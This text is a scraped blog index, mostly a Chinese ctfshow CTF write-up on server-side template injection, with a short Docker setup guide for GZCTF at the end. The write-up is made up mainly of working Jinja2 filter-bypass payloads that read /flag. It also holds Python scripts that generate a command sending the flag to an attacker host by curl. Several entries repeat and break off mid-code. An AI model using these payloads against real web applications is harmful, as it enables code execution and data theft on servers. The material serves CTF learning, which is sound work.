bl=(xiahua,xiahua,dict(builtins=a)|join,xiahua,xiahua)|join%} {%set chcr=(lipsum|attr(gb)|attr(gm)(bl)).chr%} {%set oo=dict(o=a,s=a)|join%} {%set pp=dict(po=a,pen=a)|join%} {%set space=chcr(32)%} {%set xiegang=chcr(47)%} {%set f1ag=dict(fl=a,ag=a)|join%} {%set shell=(dict(cat=a)|join,space,xiegang,f1ag)|join%} {%print lipsum|attr(gb)|attr(gm)(oo)|attr(pp)(shell)|attr(dict(re=a,ad=a)|join)()%} ","date":"2024-02-08","objectID":"/ctfshow_ssti/:2:9","series":null,"tags":["CTF","web"],"title":"ctfshow_ssti","uri":"/ctfshow_ssti/#payload3执行命令cat-flag"},{"categories":["CTF","web"],"content":"\r[web370]过滤’’、\"\"、[、args、_、os、{{、request、数字以web369的payload进行修改： ?name= {% set po=dict(po=1,p=2)|join%} {% set a=(()|select|string|list)|attr(po)(24)%} {% set re=dict(reque=1,st=1)|join%} {% set in=(a~a~dict(init=a)|join~a~a)|join()%} {% set gl=(a~a~dict(globals=q)|join~a~a)|join()%} {% set ge=(a~a~dict(getitem=a)|join~a~a)%} {% set bu=(a~a~dict(builtins=a)|join~a~a)|join()%} {% set x=(q|attr(in)|attr(gl)|attr(ge))(bu)%} {% set chr=x.chr%} {% set f=chr(47)~(dict(flag=a)|join)%} {% print(x.open(f).read())%} payload1：全角数字绕过 '０','１','２','３','４','５','６','７','８','９' 用全角数字替换payload中的半角数字 ?name= {% set po=dict(po=１,p=２)|join%} {% set a=(()|select|string|list)|attr(po)(２４)%} {% set re=dict(reque=１,st=１)|join%} {% set in=(a~a~dict(init=a)|join~a~a)|join()%} {% set gl=(a~a~dict(globals=q)|join~a~a)|join()%} {% set ge=(a~a~dict(getitem=a)|join~a~a)%} {% set bu=(a~a~dict(builtins=a)|join~a~a)|join()%} {% set x=(q|attr(in)|attr(gl)|attr(ge))(bu)%} {% set chr=x.chr%} {% set f=chr(４７)~(dict(flag=a)|join)%} {% print(x.open(f).read())%} payload2：构造数字 {% set cc=(dict(ee=a)|join|count)%} {% set cccc=(dict(eeee=a)|join|length)%} 从而cc=2,cccc=4 再{% set coun=(cc~cccc)|int%} --\u003e coun=24 快速得到一个数值 所以，构造 {% set ershisi=(cc~cccc)|int%} {% set po=dict(po=c,p=c)|join%} {% set a=(()|select|string|list)|attr(po)(ershisi)%} 等效于： {% set a=(()|select|string|list)|pop(24)%} payload： ?name= {% set c=(dict(e=a)|join|count)%} {% set cc=(dict(ee=a)|join|count)%} {% set ccc=(dict(eee=a)|join|count)%} {% set cccc=(dict(eeee=a)|join|count)%} {% set ccccccc=(dict(eeeeeee=a)|join|count)%} {% set cccccccc=(dict(eeeeeeee=a)|join|count)%} {% set ccccccccc=(dict(eeeeeeeee=a)|join|count)%} {% set cccccccccc=(dict(eeeeeeeeee=a)|join|count)%} {% set twoandfour=(cc~cccc)|int%} {% set fourandseven=(cccc~ccccccc)|int%} {% set po=dict(po=b,p=b)|join%} {% set a=(()|select|string|list)|attr(po)(twoandfour)%} {% set re=dict(reque=b,st=b)|join%} {% set in=(a~a~dict(init=a)|join~a~a)|join()%} {% set gl=(a~a~dict(globals=q)|join~a~a)|join()%} {% set ge=(a~a~dict(getitem=a)|join~a~a)%} {% set bu=(a~a~dict(builtins=a)|join~a~a)|join()%} {% set x=(q|attr(in)|attr(gl)|attr(ge))(bu)%} {% set chr=x.chr%} {% set f=chr(fourandseven)~(dict(flag=a)|join)%} {% print(x.open(f).read())%} payload3：index构造数字 ?name= {% set o=(dict(o=z)|join) %} {% set n=dict(n=z)|join %} {% set ershisi=(()|select|string|list).index(o)*(()|select|string|list).index(n) %} {% set liushisi=(()|select|string|list).index(o)*(()|select|string|list).index(o) %} {% set xiegang=(config|string|list).pop(-liushisi) %} {% set gang=(()|select|string|list).pop(ershisi) %} {% set globals=(gang,gang,(dict(globals=z)|join),gang,gang)|join %} {% set builtins=(gang,gang,(dict(builtins=z)|join),gang,gang)|join %} {% set gangfulaige=(xiegang,dict(flag=z)|join)|join %} {% print (lipsum|attr(globals)).get(builtins).open(gangfulaige).read() %} payload4：反弹shell import requests cmd='__import__(\"os\").popen(\"curl http://vps-ip:9023?p=`cat /flag`\").read()' def fun1(s): t=[] for i in range(len(s)): t.append(ord(s[i])) k='' t=list(set(t)) for i in t: k+='{% set '+'e'*(t.index(i)+1)+'=dict('+'e'*i+'=a)|join|count%}\\n' return k def fun2(s): t=[] for i in range(len(s)): t.append(ord(s[i])) t=list(set(t)) k='' for i in range(len(s)): if i\u003clen(s)-1: k+='chr('+'e'*(t.index(ord(s[i]))+1)+')%2b' else: k+='chr('+'e'*(t.index(ord(s[i]))+1)+')' return k url ='http://fc5ded74-98ba-4d98-a6f9-47ab2616ba41.challenge.ctf.show/?name='+fun1(cmd)+''' {% set coun=dict(eeeeeeeeeeeeeeeeeeeeeeee=a)|join|count%} {% set po=dict(po=a,p=a)|join%} {% set a=(()|select|string|list)|attr(po)(coun)%} {% set ini=(a,a,dict(init=a)|join,a,a)|join()%} {% set glo=(a,a,dict(globals=a)|join,a,a)|join()%} {% set geti=(a,a,dict(getitem=a)|join,a,a)|join()%} {% set built=(a,a,dict(builtins=a)|join,a,a)|join()%} {% set x=(q|attr(ini)|attr(glo)|attr(geti))(built)%} {% set chr=x.chr%} {% set cmd='''+fun2(cmd)+''' %} {%if x.eval(cmd)%} abc {%endif%} ''' print(url) 执行脚本得到payload： http://2904f8f4-2f8","date":"2024-02-08","objectID":"/ctfshow_ssti/:2:10","series":null,"tags":["CTF","web"],"title":"ctfshow_ssti","uri":"/ctfshow_ssti/#web370过滤args_osrequest数字"},{"categories":["CTF","web"],"content":"\r[web370]过滤’’、\"\"、[、args、_、os、{{、request、数字以web369的payload进行修改： ?name= {% set po=dict(po=1,p=2)|join%} {% set a=(()|select|string|list)|attr(po)(24)%} {% set re=dict(reque=1,st=1)|join%} {% set in=(a~a~dict(init=a)|join~a~a)|join()%} {% set gl=(a~a~dict(globals=q)|join~a~a)|join()%} {% set ge=(a~a~dict(getitem=a)|join~a~a)%} {% set bu=(a~a~dict(builtins=a)|join~a~a)|join()%} {% set x=(q|attr(in)|attr(gl)|attr(ge))(bu)%} {% set chr=x.chr%} {% set f=chr(47)~(dict(flag=a)|join)%} {% print(x.open(f).read())%} payload1：全角数字绕过 '０','１','２','３','４','５','６','７','８','９' 用全角数字替换payload中的半角数字 ?name= {% set po=dict(po=１,p=２)|join%} {% set a=(()|select|string|list)|attr(po)(２４)%} {% set re=dict(reque=１,st=１)|join%} {% set in=(a~a~dict(init=a)|join~a~a)|join()%} {% set gl=(a~a~dict(globals=q)|join~a~a)|join()%} {% set ge=(a~a~dict(getitem=a)|join~a~a)%} {% set bu=(a~a~dict(builtins=a)|join~a~a)|join()%} {% set x=(q|attr(in)|attr(gl)|attr(ge))(bu)%} {% set chr=x.chr%} {% set f=chr(４７)~(dict(flag=a)|join)%} {% print(x.open(f).read())%} payload2：构造数字 {% set cc=(dict(ee=a)|join|count)%} {% set cccc=(dict(eeee=a)|join|length)%} 从而cc=2,cccc=4 再{% set coun=(cc~cccc)|int%} --\u003e coun=24 快速得到一个数值 所以，构造 {% set ershisi=(cc~cccc)|int%} {% set po=dict(po=c,p=c)|join%} {% set a=(()|select|string|list)|attr(po)(ershisi)%} 等效于： {% set a=(()|select|string|list)|pop(24)%} payload： ?name= {% set c=(dict(e=a)|join|count)%} {% set cc=(dict(ee=a)|join|count)%} {% set ccc=(dict(eee=a)|join|count)%} {% set cccc=(dict(eeee=a)|join|count)%} {% set ccccccc=(dict(eeeeeee=a)|join|count)%} {% set cccccccc=(dict(eeeeeeee=a)|join|count)%} {% set ccccccccc=(dict(eeeeeeeee=a)|join|count)%} {% set cccccccccc=(dict(eeeeeeeeee=a)|join|count)%} {% set twoandfour=(cc~cccc)|int%} {% set fourandseven=(cccc~ccccccc)|int%} {% set po=dict(po=b,p=b)|join%} {% set a=(()|select|string|list)|attr(po)(twoandfour)%} {% set re=dict(reque=b,st=b)|join%} {% set in=(a~a~dict(init=a)|join~a~a)|join()%} {% set gl=(a~a~dict(globals=q)|join~a~a)|join()%} {% set ge=(a~a~dict(getitem=a)|join~a~a)%} {% set bu=(a~a~dict(builtins=a)|join~a~a)|join()%} {% set x=(q|attr(in)|attr(gl)|attr(ge))(bu)%} {% set chr=x.chr%} {% set f=chr(fourandseven)~(dict(flag=a)|join)%} {% print(x.open(f).read())%} payload3：index构造数字 ?name= {% set o=(dict(o=z)|join) %} {% set n=dict(n=z)|join %} {% set ershisi=(()|select|string|list).index(o)*(()|select|string|list).index(n) %} {% set liushisi=(()|select|string|list).index(o)*(()|select|string|list).index(o) %} {% set xiegang=(config|string|list).pop(-liushisi) %} {% set gang=(()|select|string|list).pop(ershisi) %} {% set globals=(gang,gang,(dict(globals=z)|join),gang,gang)|join %} {% set builtins=(gang,gang,(dict(builtins=z)|join),gang,gang)|join %} {% set gangfulaige=(xiegang,dict(flag=z)|join)|join %} {% print (lipsum|attr(globals)).get(builtins).open(gangfulaige).read() %} payload4：反弹shell import requests cmd='__import__(\"os\").popen(\"curl http://vps-ip:9023?p=`cat /flag`\").read()' def fun1(s): t=[] for i in range(len(s)): t.append(ord(s[i])) k='' t=list(set(t)) for i in t: k+='{% set '+'e'*(t.index(i)+1)+'=dict('+'e'*i+'=a)|join|count%}\\n' return k def fun2(s): t=[] for i in range(len(s)): t.append(ord(s[i])) t=list(set(t)) k='' for i in range(len(s)): if i","date":"2024-02-08","objectID":"/ctfshow_ssti/:2:10","series":null,"tags":["CTF","web"],"title":"ctfshow_ssti","uri":"/ctfshow_ssti/#payload1全角数字绕过"},{"categories":["CTF","web"],"content":"\r[web370]过滤’’、\"\"、[、args、_、os、{{、request、数字以web369的payload进行修改： ?name= {% set po=dict(po=1,p=2)|join%} {% set a=(()|select|string|list)|attr(po)(24)%} {% set re=dict(reque=1,st=1)|join%} {% set in=(a~a~dict(init=a)|join~a~a)|join()%} {% set gl=(a~a~dict(globals=q)|join~a~a)|join()%} {% set ge=(a~a~dict(getitem=a)|join~a~a)%} {% set bu=(a~a~dict(builtins=a)|join~a~a)|join()%} {% set x=(q|attr(in)|attr(gl)|attr(ge))(bu)%} {% set chr=x.chr%} {% set f=chr(47)~(dict(flag=a)|join)%} {% print(x.open(f).read())%} payload1：全角数字绕过 '０','１','２','３','４','５','６','７','８','９' 用全角数字替换payload中的半角数字 ?name= {% set po=dict(po=１,p=２)|join%} {% set a=(()|select|string|list)|attr(po)(２４)%} {% set re=dict(reque=１,st=１)|join%} {% set in=(a~a~dict(init=a)|join~a~a)|join()%} {% set gl=(a~a~dict(globals=q)|join~a~a)|join()%} {% set ge=(a~a~dict(getitem=a)|join~a~a)%} {% set bu=(a~a~dict(builtins=a)|join~a~a)|join()%} {% set x=(q|attr(in)|attr(gl)|attr(ge))(bu)%} {% set chr=x.chr%} {% set f=chr(４７)~(dict(flag=a)|join)%} {% print(x.open(f).read())%} payload2：构造数字 {% set cc=(dict(ee=a)|join|count)%} {% set cccc=(dict(eeee=a)|join|length)%} 从而cc=2,cccc=4 再{% set coun=(cc~cccc)|int%} --\u003e coun=24 快速得到一个数值 所以，构造 {% set ershisi=(cc~cccc)|int%} {% set po=dict(po=c,p=c)|join%} {% set a=(()|select|string|list)|attr(po)(ershisi)%} 等效于： {% set a=(()|select|string|list)|pop(24)%} payload： ?name= {% set c=(dict(e=a)|join|count)%} {% set cc=(dict(ee=a)|join|count)%} {% set ccc=(dict(eee=a)|join|count)%} {% set cccc=(dict(eeee=a)|join|count)%} {% set ccccccc=(dict(eeeeeee=a)|join|count)%} {% set cccccccc=(dict(eeeeeeee=a)|join|count)%} {% set ccccccccc=(dict(eeeeeeeee=a)|join|count)%} {% set cccccccccc=(dict(eeeeeeeeee=a)|join|count)%} {% set twoandfour=(cc~cccc)|int%} {% set fourandseven=(cccc~ccccccc)|int%} {% set po=dict(po=b,p=b)|join%} {% set a=(()|select|string|list)|attr(po)(twoandfour)%} {% set re=dict(reque=b,st=b)|join%} {% set in=(a~a~dict(init=a)|join~a~a)|join()%} {% set gl=(a~a~dict(globals=q)|join~a~a)|join()%} {% set ge=(a~a~dict(getitem=a)|join~a~a)%} {% set bu=(a~a~dict(builtins=a)|join~a~a)|join()%} {% set x=(q|attr(in)|attr(gl)|attr(ge))(bu)%} {% set chr=x.chr%} {% set f=chr(fourandseven)~(dict(flag=a)|join)%} {% print(x.open(f).read())%} payload3：index构造数字 ?name= {% set o=(dict(o=z)|join) %} {% set n=dict(n=z)|join %} {% set ershisi=(()|select|string|list).index(o)*(()|select|string|list).index(n) %} {% set liushisi=(()|select|string|list).index(o)*(()|select|string|list).index(o) %} {% set xiegang=(config|string|list).pop(-liushisi) %} {% set gang=(()|select|string|list).pop(ershisi) %} {% set globals=(gang,gang,(dict(globals=z)|join),gang,gang)|join %} {% set builtins=(gang,gang,(dict(builtins=z)|join),gang,gang)|join %} {% set gangfulaige=(xiegang,dict(flag=z)|join)|join %} {% print (lipsum|attr(globals)).get(builtins).open(gangfulaige).read() %} payload4：反弹shell import requests cmd='__import__(\"os\").popen(\"curl http://vps-ip:9023?p=`cat /flag`\").read()' def fun1(s): t=[] for i in range(len(s)): t.append(ord(s[i])) k='' t=list(set(t)) for i in t: k+='{% set '+'e'*(t.index(i)+1)+'=dict('+'e'*i+'=a)|join|count%}\\n' return k def fun2(s): t=[] for i in range(len(s)): t.append(ord(s[i])) t=list(set(t)) k='' for i in range(len(s)): if i","date":"2024-02-08","objectID":"/ctfshow_ssti/:2:10","series":null,"tags":["CTF","web"],"title":"ctfshow_ssti","uri":"/ctfshow_ssti/#payload2构造数字"},{"categories":["CTF","web"],"content":"\r[web370]过滤’’、\"\"、[、args、_、os、{{、request、数字以web369的payload进行修改： ?name= {% set po=dict(po=1,p=2)|join%} {% set a=(()|select|string|list)|attr(po)(24)%} {% set re=dict(reque=1,st=1)|join%} {% set in=(a~a~dict(init=a)|join~a~a)|join()%} {% set gl=(a~a~dict(globals=q)|join~a~a)|join()%} {% set ge=(a~a~dict(getitem=a)|join~a~a)%} {% set bu=(a~a~dict(builtins=a)|join~a~a)|join()%} {% set x=(q|attr(in)|attr(gl)|attr(ge))(bu)%} {% set chr=x.chr%} {% set f=chr(47)~(dict(flag=a)|join)%} {% print(x.open(f).read())%} payload1：全角数字绕过 '０','１','２','３','４','５','６','７','８','９' 用全角数字替换payload中的半角数字 ?name= {% set po=dict(po=１,p=２)|join%} {% set a=(()|select|string|list)|attr(po)(２４)%} {% set re=dict(reque=１,st=１)|join%} {% set in=(a~a~dict(init=a)|join~a~a)|join()%} {% set gl=(a~a~dict(globals=q)|join~a~a)|join()%} {% set ge=(a~a~dict(getitem=a)|join~a~a)%} {% set bu=(a~a~dict(builtins=a)|join~a~a)|join()%} {% set x=(q|attr(in)|attr(gl)|attr(ge))(bu)%} {% set chr=x.chr%} {% set f=chr(４７)~(dict(flag=a)|join)%} {% print(x.open(f).read())%} payload2：构造数字 {% set cc=(dict(ee=a)|join|count)%} {% set cccc=(dict(eeee=a)|join|length)%} 从而cc=2,cccc=4 再{% set coun=(cc~cccc)|int%} --\u003e coun=24 快速得到一个数值 所以，构造 {% set ershisi=(cc~cccc)|int%} {% set po=dict(po=c,p=c)|join%} {% set a=(()|select|string|list)|attr(po)(ershisi)%} 等效于： {% set a=(()|select|string|list)|pop(24)%} payload： ?name= {% set c=(dict(e=a)|join|count)%} {% set cc=(dict(ee=a)|join|count)%} {% set ccc=(dict(eee=a)|join|count)%} {% set cccc=(dict(eeee=a)|join|count)%} {% set ccccccc=(dict(eeeeeee=a)|join|count)%} {% set cccccccc=(dict(eeeeeeee=a)|join|count)%} {% set ccccccccc=(dict(eeeeeeeee=a)|join|count)%} {% set cccccccccc=(dict(eeeeeeeeee=a)|join|count)%} {% set twoandfour=(cc~cccc)|int%} {% set fourandseven=(cccc~ccccccc)|int%} {% set po=dict(po=b,p=b)|join%} {% set a=(()|select|string|list)|attr(po)(twoandfour)%} {% set re=dict(reque=b,st=b)|join%} {% set in=(a~a~dict(init=a)|join~a~a)|join()%} {% set gl=(a~a~dict(globals=q)|join~a~a)|join()%} {% set ge=(a~a~dict(getitem=a)|join~a~a)%} {% set bu=(a~a~dict(builtins=a)|join~a~a)|join()%} {% set x=(q|attr(in)|attr(gl)|attr(ge))(bu)%} {% set chr=x.chr%} {% set f=chr(fourandseven)~(dict(flag=a)|join)%} {% print(x.open(f).read())%} payload3：index构造数字 ?name= {% set o=(dict(o=z)|join) %} {% set n=dict(n=z)|join %} {% set ershisi=(()|select|string|list).index(o)*(()|select|string|list).index(n) %} {% set liushisi=(()|select|string|list).index(o)*(()|select|string|list).index(o) %} {% set xiegang=(config|string|list).pop(-liushisi) %} {% set gang=(()|select|string|list).pop(ershisi) %} {% set globals=(gang,gang,(dict(globals=z)|join),gang,gang)|join %} {% set builtins=(gang,gang,(dict(builtins=z)|join),gang,gang)|join %} {% set gangfulaige=(xiegang,dict(flag=z)|join)|join %} {% print (lipsum|attr(globals)).get(builtins).open(gangfulaige).read() %} payload4：反弹shell import requests cmd='__import__(\"os\").popen(\"curl http://vps-ip:9023?p=`cat /flag`\").read()' def fun1(s): t=[] for i in range(len(s)): t.append(ord(s[i])) k='' t=list(set(t)) for i in t: k+='{% set '+'e'*(t.index(i)+1)+'=dict('+'e'*i+'=a)|join|count%}\\n' return k def fun2(s): t=[] for i in range(len(s)): t.append(ord(s[i])) t=list(set(t)) k='' for i in range(len(s)): if i","date":"2024-02-08","objectID":"/ctfshow_ssti/:2:10","series":null,"tags":["CTF","web"],"title":"ctfshow_ssti","uri":"/ctfshow_ssti/#payload3index构造数字"},{"categories":["CTF","web"],"content":"\r[web370]过滤’’、\"\"、[、args、_、os、{{、request、数字以web369的payload进行修改： ?name= {% set po=dict(po=1,p=2)|join%} {% set a=(()|select|string|list)|attr(po)(24)%} {% set re=dict(reque=1,st=1)|join%} {% set in=(a~a~dict(init=a)|join~a~a)|join()%} {% set gl=(a~a~dict(globals=q)|join~a~a)|join()%} {% set ge=(a~a~dict(getitem=a)|join~a~a)%} {% set bu=(a~a~dict(builtins=a)|join~a~a)|join()%} {% set x=(q|attr(in)|attr(gl)|attr(ge))(bu)%} {% set chr=x.chr%} {% set f=chr(47)~(dict(flag=a)|join)%} {% print(x.open(f).read())%} payload1：全角数字绕过 '０','１','２','３','４','５','６','７','８','９' 用全角数字替换payload中的半角数字 ?name= {% set po=dict(po=１,p=２)|join%} {% set a=(()|select|string|list)|attr(po)(２４)%} {% set re=dict(reque=１,st=１)|join%} {% set in=(a~a~dict(init=a)|join~a~a)|join()%} {% set gl=(a~a~dict(globals=q)|join~a~a)|join()%} {% set ge=(a~a~dict(getitem=a)|join~a~a)%} {% set bu=(a~a~dict(builtins=a)|join~a~a)|join()%} {% set x=(q|attr(in)|attr(gl)|attr(ge))(bu)%} {% set chr=x.chr%} {% set f=chr(４７)~(dict(flag=a)|join)%} {% print(x.open(f).read())%} payload2：构造数字 {% set cc=(dict(ee=a)|join|count)%} {% set cccc=(dict(eeee=a)|join|length)%} 从而cc=2,cccc=4 再{% set coun=(cc~cccc)|int%} --\u003e coun=24 快速得到一个数值 所以，构造 {% set ershisi=(cc~cccc)|int%} {% set po=dict(po=c,p=c)|join%} {% set a=(()|select|string|list)|attr(po)(ershisi)%} 等效于： {% set a=(()|select|string|list)|pop(24)%} payload： ?name= {% set c=(dict(e=a)|join|count)%} {% set cc=(dict(ee=a)|join|count)%} {% set ccc=(dict(eee=a)|join|count)%} {% set cccc=(dict(eeee=a)|join|count)%} {% set ccccccc=(dict(eeeeeee=a)|join|count)%} {% set cccccccc=(dict(eeeeeeee=a)|join|count)%} {% set ccccccccc=(dict(eeeeeeeee=a)|join|count)%} {% set cccccccccc=(dict(eeeeeeeeee=a)|join|count)%} {% set twoandfour=(cc~cccc)|int%} {% set fourandseven=(cccc~ccccccc)|int%} {% set po=dict(po=b,p=b)|join%} {% set a=(()|select|string|list)|attr(po)(twoandfour)%} {% set re=dict(reque=b,st=b)|join%} {% set in=(a~a~dict(init=a)|join~a~a)|join()%} {% set gl=(a~a~dict(globals=q)|join~a~a)|join()%} {% set ge=(a~a~dict(getitem=a)|join~a~a)%} {% set bu=(a~a~dict(builtins=a)|join~a~a)|join()%} {% set x=(q|attr(in)|attr(gl)|attr(ge))(bu)%} {% set chr=x.chr%} {% set f=chr(fourandseven)~(dict(flag=a)|join)%} {% print(x.open(f).read())%} payload3：index构造数字 ?name= {% set o=(dict(o=z)|join) %} {% set n=dict(n=z)|join %} {% set ershisi=(()|select|string|list).index(o)*(()|select|string|list).index(n) %} {% set liushisi=(()|select|string|list).index(o)*(()|select|string|list).index(o) %} {% set xiegang=(config|string|list).pop(-liushisi) %} {% set gang=(()|select|string|list).pop(ershisi) %} {% set globals=(gang,gang,(dict(globals=z)|join),gang,gang)|join %} {% set builtins=(gang,gang,(dict(builtins=z)|join),gang,gang)|join %} {% set gangfulaige=(xiegang,dict(flag=z)|join)|join %} {% print (lipsum|attr(globals)).get(builtins).open(gangfulaige).read() %} payload4：反弹shell import requests cmd='__import__(\"os\").popen(\"curl http://vps-ip:9023?p=`cat /flag`\").read()' def fun1(s): t=[] for i in range(len(s)): t.append(ord(s[i])) k='' t=list(set(t)) for i in t: k+='{% set '+'e'*(t.index(i)+1)+'=dict('+'e'*i+'=a)|join|count%}\\n' return k def fun2(s): t=[] for i in range(len(s)): t.append(ord(s[i])) t=list(set(t)) k='' for i in range(len(s)): if i","date":"2024-02-08","objectID":"/ctfshow_ssti/:2:10","series":null,"tags":["CTF","web"],"title":"ctfshow_ssti","uri":"/ctfshow_ssti/#payload4反弹shell"},{"categories":["CTF","web"],"content":"\r[web371]过滤’’、\"\"、[、args、_、os、{{、request、数字、{%print{% endraw %} payload1：web370反弹shell\rpayload2：payload固定，里面的一部分cmd用脚本生成{% raw %} payload： ?name= {% set c=(t|count)%} {% set cc=(dict(e=a)|join|count)%} {% set ccc=(dict(ee=a)|join|count)%} {% set cccc=(dict(eee=a)|join|count)%} {% set ccccc=(dict(eeee=a)|join|count)%} {% set cccccc=(dict(eeeee=a)|join|count)%} {% set ccccccc=(dict(eeeeee=a)|join|count)%} {% set cccccccc=(dict(eeeeeee=a)|join|count)%} {% set ccccccccc=(dict(eeeeeeee=a)|join|count)%} {% set cccccccccc=(dict(eeeeeeeee=a)|join|count)%} {% set ccccccccccc=(dict(eeeeeeeeee=a)|join|count)%} {% set cccccccccccc=(dict(eeeeeeeeeee=a)|join|count)%} {% set coun=(ccc~ccccc)|int%} {% set po=dict(po=a,p=a)|join%} {% set a=(()|select|string|list)|attr(po)(coun)%} {% set ini=(a,a,dict(init=a)|join,a,a)|join()%} {% set glo=(a,a,dict(globals=a)|join,a,a)|join()%} {% set geti=(a,a,dict(getitem=a)|join,a,a)|join()%} {% set built=(a,a,dict(builtins=a)|join,a,a)|join()%} {% set x=(q|attr(ini)|attr(glo)|attr(geti))(built)%} {% set chr=x.chr%} {% set cmd=【xxx】 %} {百分号if x.eval(cmd)%} abc {百分号endif百分号} {% endraw %} 生成cmd的脚本： def aaa(t): t='('+(int(t[:-1:])+1)*'c'+'~'+(int(t[-1])+1)*'c'+')|int' return t s='__import__(\"os\").popen(\"curl http://vps-ip:9023?p=`cat /flag`\").read()' def ccchr(s): t='' for i in range(len(s)): if i\u003clen(s)-1: t+='chr('+aaa(str(ord(s[i])))+')%2b' else: t+='chr('+aaa(str(ord(s[i])))+')' return t print(ccchr(s)) {% raw %} ","date":"2024-02-08","objectID":"/ctfshow_ssti/:2:11","series":null,"tags":["CTF","web"],"title":"ctfshow_ssti","uri":"/ctfshow_ssti/#web371过滤args_osrequest数字print"},{"categories":["CTF","web"],"content":"\r[web371]过滤’’、\"\"、[、args、_、os、{{、request、数字、{%print{% endraw %} payload1：web370反弹shell\rpayload2：payload固定，里面的一部分cmd用脚本生成{% raw %} payload： ?name= {% set c=(t|count)%} {% set cc=(dict(e=a)|join|count)%} {% set ccc=(dict(ee=a)|join|count)%} {% set cccc=(dict(eee=a)|join|count)%} {% set ccccc=(dict(eeee=a)|join|count)%} {% set cccccc=(dict(eeeee=a)|join|count)%} {% set ccccccc=(dict(eeeeee=a)|join|count)%} {% set cccccccc=(dict(eeeeeee=a)|join|count)%} {% set ccccccccc=(dict(eeeeeeee=a)|join|count)%} {% set cccccccccc=(dict(eeeeeeeee=a)|join|count)%} {% set ccccccccccc=(dict(eeeeeeeeee=a)|join|count)%} {% set cccccccccccc=(dict(eeeeeeeeeee=a)|join|count)%} {% set coun=(ccc~ccccc)|int%} {% set po=dict(po=a,p=a)|join%} {% set a=(()|select|string|list)|attr(po)(coun)%} {% set ini=(a,a,dict(init=a)|join,a,a)|join()%} {% set glo=(a,a,dict(globals=a)|join,a,a)|join()%} {% set geti=(a,a,dict(getitem=a)|join,a,a)|join()%} {% set built=(a,a,dict(builtins=a)|join,a,a)|join()%} {% set x=(q|attr(ini)|attr(glo)|attr(geti))(built)%} {% set chr=x.chr%} {% set cmd=【xxx】 %} {百分号if x.eval(cmd)%} abc {百分号endif百分号} {% endraw %} 生成cmd的脚本： def aaa(t): t='('+(int(t[:-1:])+1)*'c'+'~'+(int(t[-1])+1)*'c'+')|int' return t s='__import__(\"os\").popen(\"curl http://vps-ip:9023?p=`cat /flag`\").read()' def ccchr(s): t='' for i in range(len(s)): if i","date":"2024-02-08","objectID":"/ctfshow_ssti/:2:11","series":null,"tags":["CTF","web"],"title":"ctfshow_ssti","uri":"/ctfshow_ssti/#payload1web370反弹shell"},{"categories":["CTF","web"],"content":"\r[web371]过滤’’、\"\"、[、args、_、os、{{、request、数字、{%print{% endraw %} payload1：web370反弹shell\rpayload2：payload固定，里面的一部分cmd用脚本生成{% raw %} payload： ?name= {% set c=(t|count)%} {% set cc=(dict(e=a)|join|count)%} {% set ccc=(dict(ee=a)|join|count)%} {% set cccc=(dict(eee=a)|join|count)%} {% set ccccc=(dict(eeee=a)|join|count)%} {% set cccccc=(dict(eeeee=a)|join|count)%} {% set ccccccc=(dict(eeeeee=a)|join|count)%} {% set cccccccc=(dict(eeeeeee=a)|join|count)%} {% set ccccccccc=(dict(eeeeeeee=a)|join|count)%} {% set cccccccccc=(dict(eeeeeeeee=a)|join|count)%} {% set ccccccccccc=(dict(eeeeeeeeee=a)|join|count)%} {% set cccccccccccc=(dict(eeeeeeeeeee=a)|join|count)%} {% set coun=(ccc~ccccc)|int%} {% set po=dict(po=a,p=a)|join%} {% set a=(()|select|string|list)|attr(po)(coun)%} {% set ini=(a,a,dict(init=a)|join,a,a)|join()%} {% set glo=(a,a,dict(globals=a)|join,a,a)|join()%} {% set geti=(a,a,dict(getitem=a)|join,a,a)|join()%} {% set built=(a,a,dict(builtins=a)|join,a,a)|join()%} {% set x=(q|attr(ini)|attr(glo)|attr(geti))(built)%} {% set chr=x.chr%} {% set cmd=【xxx】 %} {百分号if x.eval(cmd)%} abc {百分号endif百分号} {% endraw %} 生成cmd的脚本： def aaa(t): t='('+(int(t[:-1:])+1)*'c'+'~'+(int(t[-1])+1)*'c'+')|int' return t s='__import__(\"os\").popen(\"curl http://vps-ip:9023?p=`cat /flag`\").read()' def ccchr(s): t='' for i in range(len(s)): if i","date":"2024-02-08","objectID":"/ctfshow_ssti/:2:11","series":null,"tags":["CTF","web"],"title":"ctfshow_ssti","uri":"/ctfshow_ssti/#payload2payload固定里面的一部分cmd用脚本生成"},{"categories":["CTF","web"],"content":"\r[web372]过滤’’、\"\"、[、args、_、os、{{、request、数字、{%print、count{% endraw %} 利用上题的payload2，count换成length 参考： https://blog.csdn.net/Jayjay___/article/details/132210050 https://www.freebuf.com/articles/web/325473.html {% endif %} ","date":"2024-02-08","objectID":"/ctfshow_ssti/:2:12","series":null,"tags":["CTF","web"],"title":"ctfshow_ssti","uri":"/ctfshow_ssti/#web372过滤args_osrequest数字printcount"},{"categories":["web"],"content":"环境：Ubuntu20.04 ","date":"2024-01-20","objectID":"/docker_gzctf/:0:0","series":null,"tags":["web"],"title":"GZCTF搭建","uri":"/docker_gzctf/#"},{"categories":["web"],"content":"\rdocker安装1.更新系统软件包列表： sudo apt update 2.安装必要的依赖项： sudo apt install apt-transport-https ca-certificates curl software-properties-common 3.添加 Docker GPG 密钥： curl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo gpg --dearmor -o /usr/share/keyrings/docker-archive-keyring.gpg 4.设置 Docker 存储库： 对于 x86_64（通常为 64 位）系统： echo \"deb [arch=amd64 signed-by=/usr/share/keyrings/docker-archive-keyring.gpg] https://download.docker.com/linux/ubuntu $(lsb_release -cs) stable\" | sudo tee /etc/apt/sources.list.d/docker.list \u003e /dev/null 对于 ARMhf（如 Raspberry Pi）或其他特定体系结构的系统，请根据官方文档中提供的指南选择正确的存储库。 5.更新软件包索引并安装 Docker CE（社区版）： sudo apt update sudo apt install docker-ce docker-ce-cli containerd.io 6.将当前用户添加到 docker 组（无需重启）： sudo usermod -aG docker $USER 7.注销并重新登录以使用户组变更生效。 若出现下面的报错： [xxxx@xxxx ~]$ docker ps Got permission denied while trying to connect to the Docker daemon socket at unix:///var/run/docker.sock: Get \"http://%2Fvar%2Frun%2Fdocker.sock/v1.24/containers/json\": dial unix /var/run/docker.sock: connect: permission denied 问题出在用户为访问/var/run/docker.sock的权限，只需给用户增加权限即可。命令行输入： sudo chown root:docker /var/run/docker.sock # 修改docker.sock权限为root:docker sudo groupadd docker # 添加docker用户组 sudo gpasswd -a $USER docker # 将当前用户添加至docker用户组 newgrp docker # 更新docker用户组 